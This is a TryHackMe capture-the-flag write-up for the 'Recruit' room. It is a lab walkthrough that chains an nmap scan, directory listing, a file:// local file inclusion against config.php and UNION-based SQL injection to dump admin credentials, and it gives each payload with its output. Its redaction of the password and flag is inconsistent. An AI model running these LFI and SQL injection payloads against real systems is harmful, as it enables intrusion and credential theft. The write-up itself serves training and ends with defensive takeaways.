# Recruit — CTF Writeup

> **Recruit** has just launched its new recruitment portal, allowing HR staff to manage candidate applications and administrators to oversee hiring decisions. While the platform appears functional, management suspects that security may have been overlooked during development. Your task is to assess the application like a real attacker, mapping its structure, abusing exposed functionality, and exploiting vulnerabilities.

---

## Table of Contents

- [Challenge Overview](#challenge-overview)
- [Step 1 — Nmap Scan](#step-1--nmap-scan)
- [Step 2 — Sitemap Enumeration](#step-2--sitemap-enumeration)
- [Step 3 — Mail Log Discovery & Recruiter Username](#step-3--mail-log-discovery--recruiter-username)
- [Step 4 — LFI via file.php → config.php Exposed](#step-4--lfi-via-filephp--configphp-exposed)
- [Step 5 — SQL Injection Confirmed](#step-5--sql-injection-confirmed)
- [Step 6 — Database Name Enumeration](#step-6--database-name-enumeration)
- [Step 7 — Table Enumeration](#step-7--table-enumeration)
- [Step 8 — Column Enumeration (users table)](#step-8--column-enumeration-users-table)
- [Step 9 — Dumping Admin Credentials](#step-9--dumping-admin-credentials)
- [Step 10 — Admin Login & Final Flag](#step-10--admin-login--final-flag)
- [Flags Summary](#flags-summary)
- [Vulnerability Summary](#vulnerability-summary)
- [Key Takeaways](#key-takeaways)

---

## Challenge Overview

| Field       | Details                                          |
|-------------|--------------------------------------------------|
| Name        | Recruit                                          |
| Platform    | TryHackMe                                        |
| Difficulty  | Easy / Medium                                    |
| Category    | Web — LFI + SQL Injection + Recon                |
| Target IP   | 10.48.160.44                                     |
| Objective   | Exploit the recruitment portal to capture flags  |

---

## Step 1 — Nmap Scan

Started with a full port scan with service and script detection to map the attack surface.

**Command:**
```bash
nmap -sV -sS -Pn -sC -p- 10.48.160.44
```

**Scan Results:**

| Port    | State | Service | Version                                     |
|---------|-------|---------|---------------------------------------------|
| 22/tcp  | open  | ssh     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.7             |
| 53/tcp  | open  | domain  | ISC BIND 9.16.1 (Ubuntu Linux)              |
| 80/tcp  | open  | http    | Apache httpd 2.4.41 (Ubuntu)                |

**Additional Findings:**
```
http-title: Recruit
http-cookie-flags: PHPSESSID — httponly flag NOT set
http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Key Observations:**
> - Port **80** is serving a PHP-based web app titled **"Recruit"**
> - `PHPSESSID` cookie is missing the `httponly` flag — a potential session hijack risk
> - DNS (port 53) is open — worth noting for further recon
> - No HTTPS — all traffic is unencrypted

---

## Step 2 — Sitemap Enumeration

Navigated to `sitemap.xml` to discover all application endpoints exposed by the developers.

**URL:**
```
http://10.48.160.44/sitemap.xml
```

**Endpoints Discovered:**

| Endpoint                          | Category              | Priority |
|-----------------------------------|-----------------------|----------|
| `http://recruit.thm/index.php`    | Main page             | 1.0      |
| `http://recruit.thm/api.php`      | API & Documentation   | 0.8      |
| `http://recruit.thm/file.php`     | CV Retrieval Service  | 0.6      |
| `http://recruit.thm/mail/`        | Mails (logs)          | 0.5      |
| `http://recruit.thm/dashboard.php`| Authenticated Pages   | 0.4      |
| `http://recruit.thm/logout.php`   | Authenticated Pages   | 0.2      |
| `http://recruit.thm/assets/`      | Static Assets         | 0.1      |

**Interesting comment found inside sitemap.xml:**
```xml
<!--
  Notes:
  - Some directories may contain internal documentation or logs.
  - Certain endpoints are intended for internal HR integrations.
  - Access to sensitive data is role-restricted.
-->
```

> This is a critical hint — the comment confirms that **logs** and **internal endpoints** exist.  
> Two endpoints stand out immediately: **`file.php`** (CV Retrieval) and **`mail/`** (Mail logs).

---

## Step 3 — Mail Log Discovery & Recruiter Username

Navigated to the `/mail/` directory. Apache directory listing was enabled, revealing a `mail.log` file.

**URL:**
```
http://10.48.160.44/mail/
```

**Directory Contents:**

| Name       | Last Modified       | Size |
|------------|---------------------|------|
| mail.log   | 2025-12-18 08:28    | 1.6K |

**Contents of mail.log:**
```
From: HR Team <hr@recruit.thm>
To: IT Support <it-support@recruit.thm>
Date: Tue, 14 May 2024 09:32:10 +0000
Subject: Recruitment Portal Deployment Confirmation

Hi Team,

Just a quick update to confirm that the new Recruitment Portal
has been deployed successfully and is functioning as expected.

We've completed basic validation:
- Login page is accessible
- Candidate dashboard loads correctly
- API documentation page is live

As discussed during deployment:
- HR login credentials (username: hr) are currently stored in the
  application configuration file (config.php) for ease of access
  during the initial rollout phase.
- Administrator credentials are NOT stored in the application
  files and are securely maintained within the backend database.
```

> **Critical findings from this log:**
> - **Recruiter username is: `hr`**
> - HR credentials are stored in **`config.php`**
> - Admin credentials are stored in the **database** (useful for later SQLi)

---

## Step 4 — LFI via file.php → config.php Exposed

The `file.php` endpoint accepts a `cv` parameter. Tested it for **Local File Inclusion (LFI)** by passing a `file://` path directly.

**Payload:**
```
http://10.48.160.44/file.php?cv=file:///var/www/html/config.php
```

**Response — config.php contents:**
```php
<?php
/*
|------------------------------------------------------------------
| Application Configuration
|------------------------------------------------------------------
*/

$APP_NAME    = 'Recruit';
$APP_ENV     = 'production';
$APP_VERSION = '1.2.4';
$APP_DEBUG   = false;

/*
|------------------------------------------------------------------
| HR Credentials (Temporary — Initial Rollout Phase)
|------------------------------------------------------------------
| NOTE:
| These credentials are stored here temporarily for ease of access
| during the initial deployment and will be moved to the database
| in a future release.
*/

$HR_PASSWORD = 'hrpassword123';
```

> 🔑 **HR Credentials found:**
> - **Username:** `hr`
> - **Password:** `hrpassword123`
>
> Logged in to the portal with these credentials.

---

## Step 5 — SQL Injection Confirmed

After logging in as the HR user, explored the **Candidate Applications dashboard** which has a search feature. Tested it for SQL injection using an `ORDER BY` clause to determine the number of columns.

**Payload tested:**
```sql
' ORDER BY 5 --
```

**Response:**
```
SQL Error: Unknown column '5' in 'order clause'
```

> The error was printed directly to the page — confirming **error-based SQL injection** is present.  
> Testing `ORDER BY 4` returned no error, confirming **4 columns** in the query.

---

## Step 6 — Database Name Enumeration

With SQLi confirmed, used a `UNION SELECT` payload to enumerate the database names available on the server.

**Payload:**
```sql
' UNION SELECT 1,2,GROUP_CONCAT(schema_name),4 FROM information_schema.schemata --
```

**Result (injected row in Position column):**
```
mysql, information_schema, performance_schema, sys, phpmyadmin, recruit_db
```

> **Target database identified:** `recruit_db`

---

## Step 7 — Table Enumeration

Queried `information_schema.tables` to list all tables inside `recruit_db`.

**Payload:**
```sql
' UNION SELECT 1,2,GROUP_CONCAT(table_name),4 FROM information_schema.tables WHERE table_schema='recruit_db' --
```

**Result:**
```
candidates, users
```

> Two tables found: `candidates` and **`users`** — the `users` table is the priority target.

---

## Step 8 — Column Enumeration (users table)

Queried `information_schema.columns` to reveal what columns exist in the `users` table.

**Payload:**
```sql
' UNION SELECT 1,2,GROUP_CONCAT(column_name),4 FROM information_schema.columns WHERE table_name='users' --
```

**Result:**
```
USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS, MAX_SESSION_CONTROLLED_MEMORY,
MAX_SESSION_TOTAL_MEMORY, id, username, password
```

> Key columns identified: **`id`**, **`username`**, **`password`**

---

## Step 9 — Dumping Admin Credentials

Used `GROUP_CONCAT` with a separator to dump username and password pairs from the `users` table.

**Payload:**
```sql
' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password),4 FROM users --
```

**Result (injected row):**
```
admin:admin@001admin
```

> 🔑 **Admin credentials found:**
> - **Username:** `admin`
> - **Password:** `admin@001XXXXX`

---

## Step 10 — Admin Login & Final Flag

Logged out from the HR account and logged back in using the admin credentials obtained from the database.

**URL:** `http://10.48.160.44/dashboard.php`

Upon successful login, the admin dashboard displayed the **ADMIN Flag** directly on the page.

**Dashboard — Candidate Applications (Admin view):**

| ID | Name           | Position           | Status       |
|----|----------------|--------------------|--------------|
| 1  | Alice Johnson  | Frontend Developer | Approved     |
| 2  | Bob Smith      | Backend Developer  | Under Review |
| 3  | Charlie Brown  | Security Analyst   | Rejected     |
| 4  | Diana Prince   | HR Executive       | Selected     |

**Flag displayed:**
```
THM{XXXXXX_IN_XXXXXX}
```

> 🚩 **Final Flag:** `THM{XXXXXX_IN_XXXXXX}`

---

## Flags Summary

| # | Flag                    | How Obtained                              |
|---|-------------------------|-------------------------------------------|
| 1 | `THM{LOGGED_IN_ADMIN1}` | Logged in as admin via SQLi-dumped creds  |

---

## Vulnerability Summary

| # | Vulnerability              | Location                   | Impact                          |
|---|----------------------------|----------------------------|---------------------------------|
| 1 | Directory Listing Enabled  | `/mail/`                   | Exposed internal mail logs      |
| 2 | Sensitive Data in Logs     | `/mail/mail.log`           | Leaked HR username & config hint|
| 3 | Local File Inclusion (LFI) | `file.php?cv=`             | Read `config.php` → HR password |
| 4 | Hardcoded Credentials      | `config.php`               | HR password in source code      |
| 5 | SQL Injection (UNION-based)| `dashboard.php?search=`    | Full database dump → admin creds|
| 6 | Missing `httponly` flag    | `PHPSESSID` cookie         | Potential session hijack via XSS|

---

## Attack Chain

```
Nmap → Port 80 (Apache/PHP) → sitemap.xml → /mail/ directory listing
→ mail.log → username: hr, password in config.php
→ file.php LFI → config.php → HR password: hrpassword123
→ Login as HR → Search bar SQLi → ORDER BY 4 (4 columns confirmed)
→ Enumerate DB: recruit_db → Tables: users → Columns: username, password
→ Dump: admin:admin@001admin → Login as Admin → Flag: THM{LOGGED_IN_ADMIN1}
```

---

## Key Takeaways

- Always check **`sitemap.xml`** — developers often expose internal endpoints here without realising
- **Directory listing** on sensitive paths like `/mail/` leaks internal communication and credentials
- **LFI vulnerabilities** in file-serving endpoints (`file.php?cv=`) can expose source code and config files
- **Never hardcode credentials** in PHP config files — use environment variables or a secrets manager
- **SQL error messages** should never be displayed to users — they reveal database structure and confirm injection
- `UNION SELECT` based SQLi allows complete extraction of any data from the database
- The `httponly` flag on session cookies prevents JavaScript from reading them — always set it

---

*Writeup by: [showrya] | Platform: TryHackMe | Room: Recruit*
